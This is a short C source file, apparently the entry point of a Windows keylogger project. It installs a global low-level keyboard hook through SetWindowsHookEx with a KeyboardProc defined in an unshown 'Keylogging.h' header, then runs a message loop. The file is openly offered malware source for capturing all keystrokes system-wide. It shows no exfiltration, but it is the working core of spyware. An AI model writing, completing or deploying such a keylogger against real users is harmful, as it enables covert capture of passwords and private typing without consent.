#include"Keylogging.h"
int main()
{
	printf("opening file\n");
	printf("hooking the keyboard\n");
	//setting the hook, that links to the active window using the keyboardProcedure that we created in the keylogging file
	keyboardhook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, 0, 0);
	MSG msg = { 0 };
	for (;;)
	{
		bool test = GetMessage(&msg, NULL, 0, 0);
		if (test == FALSE)
		{
			UnhookWindowsHookEx(keyboardhook);
		}
	}
	return 0;
}